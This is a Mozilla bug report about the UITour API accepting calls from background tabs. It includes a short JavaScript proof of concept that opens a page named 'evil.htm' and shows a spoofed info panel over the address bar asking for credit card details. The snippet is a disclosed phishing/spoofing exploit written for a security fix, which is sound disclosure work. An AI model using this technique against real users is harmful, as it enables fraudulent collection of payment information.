@@ -1,0 +1,21 @@
+UITour: onPageEvent doesn't ignore API call from background tab
+Created attachment 8501386
+Screen Shot of example exploit
+
+UITour annotations/behaviour is torn down when a non-Tour tab is selected but we aren't preventing UITour API call from background tab on the whitelist.
+
+If one of the whitelisted mozilla.org website wa compromised, user could be tricked into taking an action on some other tab using showInfo (an info panel anchored in the browser chrome). The info panel can cover the address bar and doesn't dismiss with outside click (the X would have be clicked).
+
+Example code you can run on https://www.mozilla.org/en-US/firefox/35.0a1/tour/ in the Web Console:
+
+window.onclick = function () {
+window.open('https://people.mozilla.org/~mnoorenberghe/bugs/evil.htm')
+setTimeout(function () {
+Mozilla.UITour.showInfo('selectedTabIcon',
+'Enter your credit card to purchase Mozilla Firefox!',
+'Three easy payment of $9.99',
+'//mozorg.cdn.mozilla.net/media/img/firefox/australis/logo.png?2014-03')
+}, 400)
+}
+
+Once you have run this, click anywhere in the empty area of the page to have the spoofing tab and info panel open.
